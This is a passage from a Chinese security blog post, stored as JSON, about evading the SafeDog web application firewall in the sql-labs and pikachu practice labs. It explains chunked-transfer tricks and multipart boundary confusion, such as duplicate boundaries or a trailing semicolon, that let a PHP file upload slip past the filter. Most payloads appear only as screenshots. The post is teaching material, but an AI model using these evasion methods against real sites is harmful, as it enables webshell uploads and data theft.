class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-bc9708d3d40f2fbffbe056e6178446a20e591a2f.png\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"读列名：\"><a href=\"#读列名：\" class=\"headerlink\" title=\"读列名：\"></a>读列名：</h4><p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-032cc48054e2dcb659e0ea84c204527ea3b7acb3.png\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"读取数据：\"><a href=\"#读取数据：\" class=\"headerlink\" title=\"读取数据：\"></a>读取数据：</h4><p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-d9b88084f62e45cd38207caac07d610b7b577ff3.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"绕过安全狗的文件上传（以pikachu靶场为例\"><a href=\"#绕过安全狗的文件上传（以pikachu靶场为例\" class=\"headerlink\" title=\"绕过安全狗的文件上传（以pikachu靶场为例\"></a>绕过安全狗的文件上传（以pikachu靶场为例</h1><p>这里上面讲到了分块传输，这里直接先使用分块传输来进行绕过。这里讲下计算方式，因为文件上传不像sql注入那样单行，所以文件上传是会有回车和空格的计算，（一个回车和一个空格占两个字符）。例如下图：<br><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-d9b88084f62e45cd38207caac07d610b7b577ff3.png\" alt=\"在这里插入图片描述\"><br>红框中的部分，分别处于不同的行，所以需要传入回车，所以这部分就应该是：<br><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-615d641920757c5edb26fc22e51ee3729fdbbc36.png\" alt=\"在这里插入图片描述\"><br>这块先去上传php文件为例，可以进行分块传输的构造。然后上传。<br><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-85ccadc87659e95f985a0fb4a81079ee84864eef.png\" alt=\"在这里插入图片描述\"><br>发现单单的分块传输已经不能绕过安全狗文件上传的检测了。<br><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-924efb3c599006197b20a65a7b7a0ce779cca2e1.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"Content-Type中的boundary边界混淆绕过\"><a href=\"#Content-Type中的boundary边界混淆绕过\" class=\"headerlink\" title=\"Content-Type中的boundary边界混淆绕过\"></a>Content-Type中的boundary边界混淆绕过</h2><p>因为上面讲到了Content-Type类型，那么对于我们来说，文件上传一定是利用了Content-Type中的multipart&#x2F;form-data来进行的文件上传操作，刚才讲到了利用multipart&#x2F;form-data必须用boundary边界来进行限制，那么我们这里研究一下boundary边界的一些问题。</p>\n<h3 id=\"深入研究boundary边界问题：\"><a href=\"#深入研究boundary边界问题：\" class=\"headerlink\" title=\"深入研究boundary边界问题：\"></a>深入研究boundary边界问题：</h3><p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-beeda572d17d65e3089496e930b52d638a89f927.png\" alt=\"在这里插入图片描述\">这里拿上面的边界来做文章，这里看到了，当上面定义了boundary&#x3D;—-WFJAFAOKAJNFKLAJ的时候我想到了两个问题。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1.</span>如果有两个boundary是取前一个还是后一个？\n<span class=\"token number\">2.</span>boundary结束标志必须和定义的一定相同嘛？\n\n下面继续一一测试<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"boundary边界问题fuzz：\"><a href=\"#boundary边界问题fuzz：\" class=\"headerlink\" title=\"boundary边界问题fuzz：\"></a>boundary边界问题fuzz：</h4><h5 id=\"boundary边界一致：\"><a href=\"#boundary边界一致：\" class=\"headerlink\" title=\"boundary边界一致：\"></a>boundary边界一致：</h5><p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-8ee3edb96bced7c42235caf09f5289683aa48bbd.png\" alt=\"在这里插入图片描述\"></p>\n<h5 id=\"boundary结束标志不一致：\"><a href=\"#boundary结束标志不一致：\" class=\"headerlink\" title=\"boundary结束标志不一致：\"></a>boundary结束标志不一致：</h5><p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-985f76fbba07c752173704b783dfbd29898f3895.png\" alt=\"在这里插入图片描述\"></p>\n<h5 id=\"boundary开始标志不一致：\"><a href=\"#boundary开始标志不一致：\" class=\"headerlink\" title=\"boundary开始标志不一致：\"></a>boundary开始标志不一致：</h5><p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-ffe91b2439f69468cc4199574b4b57ac62614869.png\" alt=\"在这里插入图片描述\"><br>上面经过研究可以发现boundary结束标志不影响判断。</p>\n<h3 id=\"多个boundary：\"><a href=\"#多个boundary：\" class=\"headerlink\" title=\"多个boundary：\"></a>多个boundary：</h3><p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-dc7a8b70113e61d26ef1dde4b3bff4ef8498687d.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-f56504ef10d7f211ecf2bb2e4aebb5cf1ef276cb.png\" alt=\"在这里插入图片描述\"></p>\n<p>所以当定义两个boundary的时候，只有第一个起作用。经过了上面的测试发现，我们可以通过构造多个boundary和修改boundary结束标志来达到混淆的效果，这里进行测试。</p>\n<h5 id=\"多个boundary混淆：\"><a href=\"#多个boundary混淆：\" class=\"headerlink\" title=\"多个boundary混淆：\"></a>多个boundary混淆：</h5><p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-efe04b79be0564b29c166cc009be9301ddae1306.png\" alt=\"在这里插入图片描述\">这里进入uploads&#x2F;1.php查看</p>\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-16d076aecc158ad105c72282156dc57a49ff0cce.png\" alt=\"在这里插入图片描述\"><br>成功绕过waf。</p>\n<h5 id=\"发现：\"><a href=\"#发现：\" class=\"headerlink\" title=\"发现：\"></a>发现：</h5><p>这里发现，其他不用非得加boundary混淆，测到boundary后面加分号就直接可以绕过安全狗来上传成功。<br><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/10/attach-dfdfcee2e039c8bca59e4edac2bfceba9503cfa2.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"对于分块传输的小Tip：\"><a href=\"#对于分块传输的小Tip：\" class=\"headerlink\" title=\"对于分块传输的小Tip：\"></a>对于分块传输的小Tip：</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>分块传输的每个长度以<span class=\"token punctuation\">;</span>结尾，所以可以构造<span class=\"token number\">1</span><span class=\"token punctuation\">;</span>fjaojafjao这种来干扰<span class=\"token function\">waf</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>分块传输的时候是不会管Content<span class=\"token operator\">-</span>Length的长度，所以可以通过Content<span class=\"token operator\">-</span>Length的长度变换来绕过某些<span class=\"token function\">waf</span>\n<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>分块传输只是适用于post请求，这也是存在的弊端问题<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"总结：\"><a href=\"#总结：\" class=\"headerlink\" title=\"总结：\"></a>总结：</h1><p>绕过waf的方式多种多样，但是越简单的方式越需要底层的探索，所以底层的学习是非常必要的。希望给正在学习绕waf的小伙伴提供一些思路。而不仅限于垃圾字符填充。</p>\n<h1 id=\"参考文献：\"><a href=\"#参考文献：\" class=\"headerlink\" title=\"参考文献：\"></a>参考文献：</h1><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">https<span class=\"token punctuation\">:</span><span class=\"token comment\">//zhuanlan.zhihu.com/p/465948117</span>\nhttp<span class=\"token punctuation\">:</span><span class=\"token comment\">//t.zoukankan.com/liujizhou-p-11802189.html</span>\nhttps<span class=\"token punctuation\">:</span><span class=\"token comment\">//copyfuture.com/blogs-details/202203261638435585</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n","text":"0x01 前言某狗可谓是比较好绕过的waf，但是随着现在的发展，某狗也是越来越难绕过了，但是也不是毫无办法，争取这篇文章给正在学习waf绕过的小白来入门一种另类的waf绕过。 某狗可谓是比较好绕过的waf，但是随着现在的发展，某狗也是越来越难绕过了，但是也不是毫无办法，争取这篇文...","link":"","photos":[],"count_time":{"symbolsCount":"6.1k","symbolsTime":"6 mins."},"categories":[],"tags":[{"name":"waf绕过","slug":"waf绕过","count":1,"path":"api/tags/waf绕过.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x01-%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">0x01 前言</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA%EF%BC%9A\"><span class=\"toc-text\">环境的搭建：</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#0x02-HTTP%E8%A1%A5%E5%85%85%EF%BC%9A\"><span class=\"toc-text\">0x02 HTTP补充：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%9A%84%E4%BB%8B%E7%BB%8D%EF%BC%9A\"><span class=\"toc-text\">分块传输的介绍：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%AF%B7%E6%B1%82%E5%A4%B4Transfer-encoding%EF%BC%9A\"><span class=\"toc-text\">请求头Transfer-encoding：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#HTTP%E6%8C%81%E4%B9%85%E5%8C%96%E8%BF%9E%E6%8E%A5%EF%BC%9A\"><span class=\"toc-text\">HTTP持久化连接：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Content-Type%E4%BB%8B%E7%BB%8D%EF%BC%9A\"><span class=\"toc-text\">Content-Type介绍：</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#waf%E7%BB%95%E8%BF%87%E7%9A%84%E6%80%9D%E8%B7%AF%EF%BC%9A\"><span class=\"toc-text\">waf绕过的思路：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BE%8B%E5%A6%82%EF%BC%9A\"><span class=\"toc-text\">例如：</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E7%9A%84sql%E6%B3%A8%E5%85%A5%EF%BC%9A\"><span class=\"toc-text\">绕过安全狗的sql注入：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BB%A5sql-labs%E4%B8%BA%E4%BE%8B%EF%BC%9A\"><span class=\"toc-text\">以sql-labs为例：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D\"><span class=\"toc-text\">读取数据库名</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%AF%BB%E5%8F%96%E8%A1%A8%E5%90%8D%EF%BC%9A\"><span class=\"toc-text\">读取表名：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%AF%BB%E5%88%97%E5%90%8D%EF%BC%9A\"><span class=\"toc-text\">读列名：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE%EF%BC%9A\"><span class=\"toc-text\">读取数据：</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88%E4%BB%A5pikachu%E9%9D%B6%E5%9C%BA%E4%B8%BA%E4%BE%8B\"><span class=\"toc-text\">绕过安全狗的文件上传（以pikachu靶场为例</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Content-Type%E4%B8%AD%E7%9A%84boundary%E8%BE%B9%E7%95%8C%E6%B7%B7%E6%B7%86%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">Content-Type中的boundary边界混淆绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6boundary%E8%BE%B9%E7%95%8C%E9%97%AE%E9%A2%98%EF%BC%9A\"><span class=\"toc-text\">深入研究boundary边界问题：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#boundary%E8%BE%B9%E7%95%8C%E9%97%AE%E9%A2%98fuzz%EF%BC%9A\"><span class=\"toc-text\">boundary边界问题fuzz：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#boundary%E8%BE%B9%E7%95%8C%E4%B8%80%E8%87%B4%EF%BC%9A\"><span class=\"toc-text\">boundary边界一致：</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#boundary%E7%BB%93%E6%9D%9F%E6%A0%87%E5%BF%97%E4%B8%8D%E4%B8%80%E8%87%B4%EF%BC%9A\"><span class=\"toc-text\">boundary结束标志不一致：</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#boundary%E5%BC%80%E5%A7%8B%E6%A0%87%E5%BF%97%E4%B8%8D%E4%B8%80%E8%87%B4%EF%BC%9A\"><span class=\"toc-text\">boundary开始标志不一致：</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%A4%9A%E4%B8%AAboundary%EF%BC%9A\"><span class=\"toc-text\">多个boundary：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%A4%9A%E4%B8%AAboundary%E6%B7%B7%E6%B7%86%EF%BC%9A\"><span class=\"toc-text\">多个boundary混淆：</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%8F%91%E7%8E%B0%EF%BC%9A\"><span class=\"toc-text\">发现：</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AF%B9%E4%BA%8E%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%9A%84%E5%B0%8FTip%EF%BC%9A\"><span class=\"toc-text\">对于分块传输的小Tip：</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93%EF%BC%9A\"><span class=\"toc-text\">总结：</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE%EF%BC%9A\"><span class=\"toc-text\">参考文献：</span></a></li></ol>","author":{"name":"Q16G","slug":"blog-author","avatar":"https://www.helloimg.com/images/2023/05/23/oJaeo5.jpg","link":"/","description":"一个潜心学习网络安全的大学生","socials":{"github":"https://github.com/Q16G","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_57222016?spm=1018.2226.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"phpwebshell免杀","uid":"0bde8e350134ac3c0961afd29aadf7f8","slug":"phpwebshell免杀","date":"2023-05-24T02:40:14.000Z","updated":"2023-05-25T08:12:35.745Z","comments":true,"path":"api/articles/phpwebshell免杀.json","keywords":null,"cover":"https://img2.baidu.com/it/u=529079173,3290078057&fm=253&fmt=auto&app=120&f=JPEG?w=640&h=384","text":"AntSword0x00 前言：为什么会有改造蚁剑的想法，之前看到有做冰蝎的流量加密，来看到绕过waf，改造一些弱特征，通过流量转换，跳过密钥交互。但是，冰蝎需要反编译去改造源码，再进行修复bug，也比较复杂。而AntSword相对于冰蝎来说，不限制webshell，即一句话也可...","link":"","photos":[],"count_time":{"symbolsCount":"4.1k","symbolsTime":"4 mins."},"categories":[],"tags":[{"name":"免杀","slug":"免杀","count":1,"path":"api/tags/免杀.json"}],"author":{"name":"Q16G","slug":"blog-author","avatar":"https://www.helloimg.com/images/2023/05/23/oJaeo5.jpg","link":"/","description":"一个潜心学习网络安全的大学生","socials":{"github":"https://github.com/Q16G","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_57222016?spm=1018.2226.3001.5343","juejin":"","customs":{}}},"feature":true},"next_post":{}}